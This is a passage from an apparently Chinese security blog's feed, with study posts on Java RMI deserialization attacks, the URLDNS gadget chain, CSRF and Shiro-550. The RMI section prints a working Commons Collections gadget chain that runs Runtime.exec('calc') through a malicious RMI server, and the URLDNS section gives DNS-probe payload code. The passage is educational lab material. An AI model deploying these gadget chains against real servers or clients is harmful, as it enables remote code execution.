<span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用动态代理，将其转为Remote对象</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">RemoteProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, o);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">cast</span> <span class="operator">=</span> Remote.class.cast(RemoteProxy);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient2</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="攻击Client端"><a href="#攻击Client端" class="headerlink" title="攻击Client端"></a>攻击Client端</h2><h3 id="Server攻击Client"><a href="#Server攻击Client" class="headerlink" title="Server攻击Client"></a>Server攻击Client</h3><p>在<strong>rmi</strong>通信过程中，<strong>Server</strong>会把远程方法执行的结果返回给<strong>Client</strong>，如果返回的是一个对象，那么就会先序列化这个对象，在传递给<strong>Client</strong>，并且在<strong>Client</strong>反序列化</p>
<p>如果返回恶意对象，就有机会达成攻击</p>
<ul>
<li><h3 id="Server端"><a href="#Server端" class="headerlink" title="Server端"></a><strong>Server</strong>端</h3></li>
<li><p><strong>ICalc</strong>接口</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//带有Object类参数的远程对象</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">ICalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>ICalcImpl</strong>实现类</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ICalcImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ICalcImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">ICalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMp = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">h</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Retention.class, transformedMp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>RMIServer</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ICalcImpl</span> <span class="variable">iCalc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ICalcImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/calc&quot;</span>,iCalc);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Server</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h3 id="Client端-2"><a href="#Client端-2" class="headerlink" title="Client端"></a><strong>Client端</strong></h3></li>
<li><p><strong>RMIClient</strong></p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">iCalc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        iCalc.ICalc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMI_Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Registry攻击Client"><a href="#Registry攻击Client" class="headerlink" title="Registry攻击Client"></a>Registry攻击Client</h3><p>在<strong>Registry</strong>中，除了<strong>unbind</strong>和<strong>rebind</strong>都会返回数据给客户端，返回的数据是序列化形式</p>
<p>那么到了客户端就会进行反序列化，如果我们能控制<strong>注册中心</strong>的返回数据，那么就能实现对客户端的攻击</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS</title>
    <url>/2023/09/05/Java%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>URLDNS是java反序列化中一个比较简单的链，所以在学习CommonsCollections的利用链之前，可以先从URLDNS看起。</p>
<h1 id="0x01-什么是URLDNS"><a href="#0x01-什么是URLDNS" class="headerlink" title="0x01 什么是URLDNS"></a>0x01 什么是URLDNS</h1><p>URLDNS是ysoserial中的一个利用链名字，不过URLDNS并不能执行命令，只能发送DNS请求。</p>
<p>但是很适合我们在检测反序列化漏洞时使用：</p>
<ul>
<li>使用Java内置的构造类，对第三方库没有依赖</li>
<li>在目标没有回显的时候，可以利用DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h1 id="0x02-利用链"><a href="#0x02-利用链" class="headerlink" title="0x02 利用链"></a>0x02 利用链</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">	HashMap.putVal()</span><br><span class="line">		HashMap.hash()</span><br><span class="line">			URL.hashCode()</span><br><span class="line">				URLStreamHandler-&gt;hashCode()</span><br><span class="line">					URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">						InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure></div>

<h1 id="0x03-利用流程分析"><a href="#0x03-利用流程分析" class="headerlink" title="0x03 利用流程分析"></a>0x03 利用流程分析</h1><p>问题存在于HashMap()的readObject方法，所以我们可以直接看这个给方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    		</span><br><span class="line">    <span class="comment">//省略了部分代码......</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>发现主要是在for循环中，利用putVal方法将key放入HashMap中，并进行hash值计算</p>
<p>跟进hash方法中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现hash方法会调用对象的hashCode方法</p>
<p>此时我们传入的时URL对象，跟进URL对象中查看hashCode对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先会判断hashCode是否等于-1，是的话直接返回hashCode；否则调用handler对象的hashcode方法，在返回hashCode</p>
<p>其实主要利用的是</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br></pre></td></tr></table></figure></div>

<p>所以继续跟进handler对象中的hashCode函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//省略了部分代码......</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在hashCode中，会将URL传入getHostAddress函数中，继续跟进</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后会发现，<code>InetAddress.getByName(host)</code> 是一个静态方法，它将接收一个主机名作为输入，并返回该主机名对应的 <code>InetAddress</code> 对象，即 IP 地址的表示。该方法会进行网络请求和 DNS 解析来获取对应的 IP 地址。</p>
<p>到这里就差不多结束了，简单编写个利用链</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://dnslog&quot;</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行成功了，dnslog平台也有数据</p>
<p>但是会发现，这其实是在序列化之前就已经发送DNS请求了，之后的反序列化其实没有去做DNS请求的</p>
<p>发生这种情况是因为在利用hashMap.put()存数据的时候也调用putVal函数</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以在存数据的时候其实就发生了一次DNS请求</p>
<p>根据前文可以知道putVal中的hash会去调用key的hashCode方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>找到URL中的hashCode方法后，可以发现只要hashCode的值不等于-1后，就会直接返回hashCode，不做后面的操作</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以可以利用反射，在hashMap.put()存进数据之前将hashCode的值成不等于-1来绕过</p>
<p>在hashMap.put()存完数据后再将hashCode的值改回-1即可</p>
<p>修改后的代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://dnslog&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用反射来获取hashCode并修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">forName</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> forName.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(url,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将hashCode的值改回-1</span></span><br><span class="line">        declaredField.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-ysoserial的URLDNS"><a href="#0x04-ysoserial的URLDNS" class="headerlink" title="0x04 ysoserial的URLDNS"></a>0x04 ysoserial的URLDNS</h1><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br></pre></td></tr></table></figure></div>

<h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>URLDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2023/08/31/Web%E5%AE%89%E5%85%A8/CSRF/</url>
    <content><![CDATA[<h1 id="0x00-CSRF介绍"><a href="#0x00-CSRF介绍" class="headerlink" title="0x00 CSRF介绍"></a>0x00 CSRF介绍</h1><p>跨站请求伪造（Cross-site request forgery） 通常简写为CSRF</p>
<p>攻击者伪造一个请求（这个请求一般都是一个链接），然后欺骗目标用户进行点击，一旦用户点击了请求，整个攻击完成。故CSRF攻击也称为”on click” 攻击</p>
<p>在目标用户登录账号的前提下，点击攻击者伪造的请求，可能造成用户密码被修改等等</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSRf</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550反序列化(一)</title>
    <url>/2023/09/27/Java%E5%AE%89%E5%85%A8/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h1 id="0x01-漏洞环境搭建"><a href="#0x01-漏洞环境搭建" class="headerlink" title="0x01 漏洞环境搭建"></a>0x01 漏洞环境搭建</h1><h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><p>在<strong>Shiro &lt;&#x3D; 1.2.4</strong>中，<strong>AES</strong>加密算法的<strong>key</strong>是硬编码在源码中，当我们勾选<strong>remember me</strong>的时候<strong>shiro</strong>会将我们的<strong>Cookie</strong>信息序列化并且加密存储在<strong>Cookie</strong>的<strong>rememberMe</strong>字段中，这样在下次请求时会读取<strong>Cookie</strong>中的<strong>rememberMe</strong>字段并且进行解密然后反序列化</p>
<h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><h2 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h2><p>要找<strong>Cookie</strong>的解密过程，直接在<strong>IDEA</strong>里面全局搜索<strong>Cookie</strong>，去找<strong>Shiro</strong>包里的类</p>
<p>最后找到相关的类是<strong>CookieRememberMeManager</strong>，锁定到**rememberSerializedIdentity()**这个方法上。</p>
<h3 id="rememberSerializedIdentity"><a href="#rememberSerializedIdentity" class="headerlink" title="rememberSerializedIdentity"></a>rememberSerializedIdentity</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="type">byte</span>[] serialized)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subject)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line">    <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.encodeToString(serialized);</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">template</span> <span class="operator">=</span> getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCookie</span>(template);</span><br><span class="line">    cookie.setValue(base64);</span><br><span class="line">    cookie.saveTo(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这段代码中，先判断了是否为<strong>http</strong>请求，然后将<strong>base64</strong>编码的序列化字节数组转换成字符串，将<strong>base64</strong>存入到<strong>Cookie</strong>中</p>
<h3 id="rememberIdentity"><a href="#rememberIdentity" class="headerlink" title="rememberIdentity"></a>rememberIdentity</h3><p>找到在<strong>rememberIdentity</strong>方法中调用了<strong>rememberSerializedIdentity</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个代码中调用了<strong>convertPrincipalsToBytes</strong>方法将<strong>PrincipalCollection</strong>对象转换成字节数组</p>
<h4 id="convertPrincipalsToBytes"><a href="#convertPrincipalsToBytes" class="headerlink" title="convertPrincipalsToBytes"></a>convertPrincipalsToBytes</h4><p>可以来看一下<strong>convertPrincipalsToBytes</strong>方法做了什么</p>
